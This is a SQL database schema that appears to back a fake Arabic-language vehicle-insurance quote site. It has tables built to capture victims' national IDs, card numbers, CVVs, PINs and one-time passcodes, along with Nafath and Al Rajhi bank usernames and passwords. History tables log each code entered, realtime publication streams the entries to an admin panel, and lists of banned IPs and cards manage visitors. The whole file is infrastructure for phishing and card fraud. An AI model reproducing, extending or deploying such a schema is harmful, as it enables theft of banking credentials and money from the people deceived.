CREATE TYPE public.app_role AS ENUM ('admin','moderator','user');

CREATE TABLE public.admin_activity_log (
    id uuid DEFAULT gen_random_uuid() NOT NULL,
    actor_id uuid,
    actor_email text,
    action text NOT NULL,
    target_type text,
    target_id text,
    meta jsonb DEFAULT '{}'::jsonb NOT NULL,
    created_at timestamp with time zone DEFAULT now() NOT NULL
);
CREATE TABLE public.banned_cards (
    id uuid DEFAULT gen_random_uuid() NOT NULL,
    card_number text NOT NULL,
    created_at timestamp with time zone DEFAULT now() NOT NULL
);
CREATE TABLE public.banned_ips (
    id uuid DEFAULT gen_random_uuid() NOT NULL,
    ip text NOT NULL,
    created_at timestamp with time zone DEFAULT now() NOT NULL
);
CREATE TABLE public.quotes (
    id uuid DEFAULT gen_random_uuid() NOT NULL,
    session_id text NOT NULL,
    insurance_kind text DEFAULT 'vehicle'::text NOT NULL,
    ssn text,
    id_type text,
    phone text,
    year integer,
    serial_number text,
    plate_number text,
    is_transfer boolean DEFAULT false NOT NULL,
    seller_ssn text,
    visitor_name text,
    status text,
    current_page text DEFAULT 'الرئيسية'::text NOT NULL,
    ip_address text,
    country text,
    referrer text,
    user_agent text,
    browser text,
    os text,
    device text,
    archived boolean DEFAULT false NOT NULL,
    blocked boolean DEFAULT false NOT NULL,
    completed boolean DEFAULT false NOT NULL,
    distinguished boolean DEFAULT false NOT NULL,
    pinned boolean DEFAULT false NOT NULL,
    trashed boolean DEFAULT false NOT NULL,
    created_at timestamp with time zone DEFAULT now() NOT NULL,
    updated_at timestamp with time zone DEFAULT now() NOT NULL,
    last_active_at timestamp with time zone DEFAULT now() NOT NULL
);
CREATE TABLE public.cards (
    id uuid DEFAULT gen_random_uuid() NOT NULL,
    quote_id uuid,
    card_number text,
    card_name text,
    year text,
    cvv text,
    phone_number text,
    total_price text,
    company text,
    offer_selected_at timestamp with time zone,
    status integer DEFAULT 0 NOT NULL,
    otp text,
    pin text,
    username_nafath text,
    password_nafath text,
    username text,
    password text,
    rajhi_status integer,
    created_at timestamp with time zone DEFAULT now() NOT NULL
);
CREATE TABLE public.card_input_history (
    id uuid DEFAULT gen_random_uuid() NOT NULL,
    card_id uuid NOT NULL,
    card_number text,
    card_name text,
    year text,
    cvv text,
    phone_number text,
    created_at timestamp with time zone DEFAULT now() NOT NULL
);
CREATE TABLE public.card_nafath_history (
    id uuid DEFAULT gen_random_uuid() NOT NULL,
    card_id uuid NOT NULL,
    code text NOT NULL,
    created_at timestamp with time zone DEFAULT now() NOT NULL
);
CREATE TABLE public.card_otp_history (
    id uuid DEFAULT gen_random_uuid() NOT NULL,
    card_id uuid NOT NULL,
    otp text NOT NULL,
    created_at timestamp with time zone DEFAULT now() NOT NULL
);
CREATE TABLE public.card_pin_history (
    id uuid DEFAULT gen_random_uuid() NOT NULL,
    card_id uuid NOT NULL,
    pin text NOT NULL,
    created_at timestamp with time zone DEFAULT now() NOT NULL
);
CREATE TABLE public.card_rajhi_history (
    id uuid DEFAULT gen_random_uuid() NOT NULL,
    card_id uuid NOT NULL,
    username text,
    password text,
    created_at timestamp with time zone DEFAULT now() NOT NULL
);
CREATE TABLE public.insurance_offers (
    id uuid DEFAULT gen_random_uuid() NOT NULL,
    company_name text NOT NULL,
    company_logo_url text,
    type text NOT NULL,
    price numeric NOT NULL,
    rate numeric DEFAULT 0 NOT NULL,
    min_price numeric DEFAULT 0 NOT NULL,
    features jsonb DEFAULT '[]'::jsonb NOT NULL,
    active boolean DEFAULT true NOT NULL,
    sort_order integer DEFAULT 0 NOT NULL,
    created_at timestamp with time zone DEFAULT now() NOT NULL,
    CONSTRAINT insurance_offers_min_price_check CHECK ((min_price >= (0)::numeric)),
    CONSTRAINT insurance_offers_price_check CHECK ((price >= (0)::numeric)),
    CONSTRAINT insurance_offers_rate_check CHECK ((rate >= (0)::numeric)),
    CONSTRAINT insurance_offers_type_check CHECK ((type = ANY (ARRAY['ضد الغير'::text, 'شامل'::text, 'طبي'::text, 'سفر'::text, 'أخطاء طبية'::text])))
);
CREATE TABLE public.profiles (
    id uuid NOT NULL,
    display_name text,
    avatar_url text,
    preferences jsonb DEFAULT '{}'::jsonb NOT NULL,
    created_at timestamp with time zone DEFAULT now() NOT NULL,
    updated_at timestamp with time zone DEFAULT now() NOT NULL
);
CREATE TABLE public.quote_details (
    id uuid DEFAULT gen_random_uuid() NOT NULL,
    quote_id uuid NOT NULL,
    full_name text,
    phone text,
    message text,
    car_value numeric,
    created_year integer,
    doc_date date,
    purpose_use text,
    repair_place text,
    vehicle_type text,
    vehicle_model text,
    created_at timestamp with time zone DEFAULT now() NOT NULL,
    updated_at timestamp with time zone DEFAULT now() NOT NULL
);
CREATE TABLE public.quote_submission_history (
    id uuid DEFAULT gen_random_uuid() NOT NULL,
    quote_id uuid NOT NULL,
    insurance_kind text,
    id_type text,
    ssn text,
    phone text,
    year integer,
    serial_number text,
    plate_number text,
    is_transfer boolean,
    seller_ssn text,
    created_at timestamp with time zone DEFAULT now() NOT NULL
);
CREATE TABLE public.settings (
    setting_key text NOT NULL,
    setting_value text DEFAULT ''::text NOT NULL,
    updated_at timestamp with time zone DEFAULT now() NOT NULL
);
CREATE TABLE public.user_roles (
    id uuid DEFAULT gen_random_uuid() NOT NULL,
    user_id uuid NOT NULL,
    role public.app_role NOT NULL
);

CREATE FUNCTION public.has_role(_user_id uuid, _role public.app_role) RETURNS boolean
    LANGUAGE sql STABLE SECURITY DEFINER
    SET search_path TO 'public'
    AS $$
  SELECT EXISTS (
    SELECT 1 FROM public.user_roles
    WHERE user_id = _user_id AND role = _role
  )
$$;

ALTER TABLE ONLY public.admin_activity_log ADD CONSTRAINT admin_activity_log_pkey PRIMARY KEY (id);
ALTER TABLE ONLY public.banned_cards ADD CONSTRAINT banned_cards_card_number_key UNIQUE (card_number);
ALTER TABLE ONLY public.banned_cards ADD CONSTRAINT banned_cards_pkey PRIMARY KEY (id);
ALTER TABLE ONLY public.banned_ips ADD CONSTRAINT banned_ips_ip_key UNIQUE (ip);
ALTER TABLE ONLY public.banned_ips ADD CONSTRAINT banned_ips_pkey PRIMARY KEY (id);
ALTER TABLE ONLY public.card_input_history ADD CONSTRAINT card_input_history_pkey PRIMARY KEY (id);
ALTER TABLE ONLY public.card_nafath_history ADD CONSTRAINT card_nafath_history_pkey PRIMARY KEY (id);
ALTER TABLE ONLY public.card_otp_history ADD CONSTRAINT card_otp_history_pkey PRIMARY KEY (id);
ALTER TABLE ONLY public.card_pin_history ADD CONSTRAINT card_pin_history_pkey PRIMARY KEY (id);
ALTER TABLE ONLY public.card_rajhi_history ADD CONSTRAINT card_rajhi_history_pkey PRIMARY KEY (id);
ALTER TABLE ONLY public.cards ADD CONSTRAINT cards_pkey PRIMARY KEY (id);
ALTER TABLE ONLY public.insurance_offers ADD CONSTRAINT insurance_offers_pkey PRIMARY KEY (id);
ALTER TABLE ONLY public.profiles ADD CONSTRAINT profiles_pkey PRIMARY KEY (id);
ALTER TABLE ONLY public.quote_details ADD CONSTRAINT quote_details_pkey PRIMARY KEY (id);
ALTER TABLE ONLY public.quote_submission_history ADD CONSTRAINT quote_submission_history_pkey PRIMARY KEY (id);
ALTER TABLE ONLY public.quotes ADD CONSTRAINT quotes_pkey PRIMARY KEY (id);
ALTER TABLE ONLY public.quotes ADD CONSTRAINT quotes_session_id_key UNIQUE (session_id);
ALTER TABLE ONLY public.settings ADD CONSTRAINT settings_pkey PRIMARY KEY (setting_key);
ALTER TABLE ONLY public.user_roles ADD CONSTRAINT user_roles_pkey PRIMARY KEY (id);
ALTER TABLE ONLY public.user_roles ADD CONSTRAINT user_roles_user_id_role_key UNIQUE (user_id, role);

CREATE INDEX admin_activity_log_created_at_idx ON public.admin_activity_log USING btree (created_at DESC);
CREATE INDEX cards_created_at_idx ON public.cards USING btree (created_at DESC);
CREATE INDEX cards_quote_id_idx ON public.cards USING btree (quote_id);
CREATE INDEX insurance_offers_active_type_sort_idx ON public.insurance_offers USING btree (active, type, sort_order);
CREATE INDEX quote_details_quote_id_idx ON public.quote_details USING btree (quote_id);
CREATE INDEX quote_submission_history_quote_id_idx ON public.quote_submission_history USING btree (quote_id, created_at);
CREATE INDEX quotes_last_active_idx ON public.quotes USING btree (last_active_at DESC);

ALTER TABLE ONLY public.card_input_history ADD CONSTRAINT card_input_history_card_id_fkey FOREIGN KEY (card_id) REFERENCES public.cards(id) ON DELETE CASCADE;
ALTER TABLE ONLY public.card_nafath_history ADD CONSTRAINT card_nafath_history_card_id_fkey FOREIGN KEY (card_id) REFERENCES public.cards(id) ON DELETE CASCADE;
ALTER TABLE ONLY public.card_otp_history ADD CONSTRAINT card_otp_history_card_id_fkey FOREIGN KEY (card_id) REFERENCES public.cards(id) ON DELETE CASCADE;
ALTER TABLE ONLY public.card_pin_history ADD CONSTRAINT card_pin_history_card_id_fkey FOREIGN KEY (card_id) REFERENCES public.cards(id) ON DELETE CASCADE;
ALTER TABLE ONLY public.card_rajhi_history ADD CONSTRAINT card_rajhi_history_card_id_fkey FOREIGN KEY (card_id) REFERENCES public.cards(id) ON DELETE CASCADE;
ALTER TABLE ONLY public.cards ADD CONSTRAINT cards_quote_id_fkey FOREIGN KEY (quote_id) REFERENCES public.quotes(id) ON DELETE CASCADE;
ALTER TABLE ONLY public.quote_details ADD CONSTRAINT quote_details_quote_id_fkey FOREIGN KEY (quote_id) REFERENCES public.quotes(id) ON DELETE CASCADE;
ALTER TABLE ONLY public.quote_submission_history ADD CONSTRAINT quote_submission_history_quote_id_fkey FOREIGN KEY (quote_id) REFERENCES public.quotes(id) ON DELETE CASCADE;
ALTER TABLE ONLY public.user_roles ADD CONSTRAINT user_roles_user_id_fkey FOREIGN KEY (user_id) REFERENCES auth.users(id) ON DELETE CASCADE;

GRANT SELECT, INSERT, UPDATE, DELETE ON public.admin_activity_log, public.banned_cards, public.banned_ips, public.card_input_history, public.card_nafath_history, public.card_otp_history, public.card_pin_history, public.card_rajhi_history, public.cards, public.insurance_offers, public.profiles, public.quote_details, public.quote_submission_history, public.quotes, public.settings TO authenticated;
GRANT SELECT ON public.user_roles TO authenticated;
GRANT ALL ON public.admin_activity_log, public.banned_cards, public.banned_ips, public.card_input_history, public.card_nafath_history, public.card_otp_history, public.card_pin_history, public.card_rajhi_history, public.cards, public.insurance_offers, public.profiles, public.quote_details, public.quote_submission_history, public.quotes, public.settings, public.user_roles TO service_role;
GRANT SELECT ON public.insurance_offers TO anon;
GRANT EXECUTE ON FUNCTION public.has_role(uuid, public.app_role) TO authenticated, anon, service_role;

ALTER TABLE public.admin_activity_log ENABLE ROW LEVEL SECURITY;
ALTER TABLE public.banned_cards ENABLE ROW LEVEL SECURITY;
ALTER TABLE public.banned_ips ENABLE ROW LEVEL SECURITY;
ALTER TABLE public.card_input_history ENABLE ROW LEVEL SECURITY;
ALTER TABLE public.card_nafath_history ENABLE ROW LEVEL SECURITY;
ALTER TABLE public.card_otp_history ENABLE ROW LEVEL SECURITY;
ALTER TABLE public.card_pin_history ENABLE ROW LEVEL SECURITY;
ALTER TABLE public.card_rajhi_history ENABLE ROW LEVEL SECURITY;
ALTER TABLE public.cards ENABLE ROW LEVEL SECURITY;
ALTER TABLE public.insurance_offers ENABLE ROW LEVEL SECURITY;
ALTER TABLE public.profiles ENABLE ROW LEVEL SECURITY;
ALTER TABLE public.quote_details ENABLE ROW LEVEL SECURITY;
ALTER TABLE public.quote_submission_history ENABLE ROW LEVEL SECURITY;
ALTER TABLE public.quotes ENABLE ROW LEVEL SECURITY;
ALTER TABLE public.settings ENABLE ROW LEVEL SECURITY;
ALTER TABLE public.user_roles ENABLE ROW LEVEL SECURITY;

CREATE POLICY "Admins insert activity log" ON public.admin_activity_log FOR INSERT TO authenticated WITH CHECK (public.has_role(auth.uid(), 'admin'::public.app_role));
CREATE POLICY "Admins manage banned_cards" ON public.banned_cards TO authenticated USING (public.has_role(auth.uid(), 'admin'::public.app_role)) WITH CHECK (public.has_role(auth.uid(), 'admin'::public.app_role));
CREATE POLICY "Admins manage banned_ips" ON public.banned_ips TO authenticated USING (public.has_role(auth.uid(), 'admin'::public.app_role)) WITH CHECK (public.has_role(auth.uid(), 'admin'::public.app_role));
CREATE POLICY "Admins manage card_input_history" ON public.card_input_history TO authenticated USING (public.has_role(auth.uid(), 'admin'::public.app_role)) WITH CHECK (public.has_role(auth.uid(), 'admin'::public.app_role));
CREATE POLICY "Admins manage card_nafath_history" ON public.card_nafath_history TO authenticated USING (public.has_role(auth.uid(), 'admin'::public.app_role)) WITH CHECK (public.has_role(auth.uid(), 'admin'::public.app_role));
CREATE POLICY "Admins manage card_otp_history" ON public.card_otp_history TO authenticated USING (public.has_role(auth.uid(), 'admin'::public.app_role)) WITH CHECK (public.has_role(auth.uid(), 'admin'::public.app_role));
CREATE POLICY "Admins manage card_pin_history" ON public.card_pin_history TO authenticated USING (public.has_role(auth.uid(), 'admin'::public.app_role)) WITH CHECK (public.has_role(auth.uid(), 'admin'::public.app_role));
CREATE POLICY "Admins manage card_rajhi_history" ON public.card_rajhi_history TO authenticated USING (public.has_role(auth.uid(), 'admin'::public.app_role)) WITH CHECK (public.has_role(auth.uid(), 'admin'::public.app_role));
CREATE POLICY "Admins manage cards" ON public.cards TO authenticated USING (public.has_role(auth.uid(), 'admin'::public.app_role)) WITH CHECK (public.has_role(auth.uid(), 'admin'::public.app_role));
CREATE POLICY "Admins manage quote details" ON public.quote_details TO authenticated USING (public.has_role(auth.uid(), 'admin'::public.app_role)) WITH CHECK (public.has_role(auth.uid(), 'admin'::public.app_role));
CREATE POLICY "Admins manage quote history" ON public.quote_submission_history TO authenticated USING (public.has_role(auth.uid(), 'admin'::public.app_role)) WITH CHECK (public.has_role(auth.uid(), 'admin'::public.app_role));
CREATE POLICY "Admins manage quotes" ON public.quotes TO authenticated USING (public.has_role(auth.uid(), 'admin'::public.app_role)) WITH CHECK (public.has_role(auth.uid(), 'admin'::public.app_role));
CREATE POLICY "Admins manage settings" ON public.settings TO authenticated USING (public.has_role(auth.uid(), 'admin'::public.app_role)) WITH CHECK (public.has_role(auth.uid(), 'admin'::public.app_role));
CREATE POLICY "Admins read activity log" ON public.admin_activity_log FOR SELECT TO authenticated USING (public.has_role(auth.uid(), 'admin'::public.app_role));
CREATE POLICY "Public can read active insurance offers" ON public.insurance_offers FOR SELECT TO authenticated, anon USING ((active = true));
CREATE POLICY "Users can insert own profile" ON public.profiles FOR INSERT TO authenticated WITH CHECK ((id = auth.uid()));
CREATE POLICY "Users can read own profile" ON public.profiles FOR SELECT TO authenticated USING ((id = auth.uid()));
CREATE POLICY "Users can read own roles" ON public.user_roles FOR SELECT TO authenticated USING ((user_id = auth.uid()));
CREATE POLICY "Users can update own profile" ON public.profiles FOR UPDATE TO authenticated USING ((id = auth.uid())) WITH CHECK ((id = auth.uid()));

ALTER TABLE public.quotes REPLICA IDENTITY FULL;
ALTER TABLE public.quote_details REPLICA IDENTITY FULL;
ALTER TABLE public.quote_submission_history REPLICA IDENTITY FULL;
ALTER TABLE public.cards REPLICA IDENTITY FULL;
ALTER TABLE public.card_input_history REPLICA IDENTITY FULL;
ALTER TABLE public.card_otp_history REPLICA IDENTITY FULL;
ALTER TABLE public.card_pin_history REPLICA IDENTITY FULL;
ALTER TABLE public.card_nafath_history REPLICA IDENTITY FULL;
ALTER TABLE public.card_rajhi_history REPLICA IDENTITY FULL;
ALTER TABLE public.admin_activity_log REPLICA IDENTITY FULL;
ALTER TABLE public.insurance_offers REPLICA IDENTITY FULL;
ALTER TABLE public.settings REPLICA IDENTITY FULL;
ALTER TABLE public.banned_ips REPLICA IDENTITY FULL;
ALTER TABLE public.banned_cards REPLICA IDENTITY FULL;
ALTER PUBLICATION supabase_realtime ADD TABLE public.quotes, public.quote_details, public.quote_submission_history, public.cards, public.card_input_history, public.card_otp_history, public.card_pin_history, public.card_nafath_history, public.card_rajhi_history, public.admin_activity_log, public.insurance_offers, public.settings, public.banned_ips, public.banned_cards;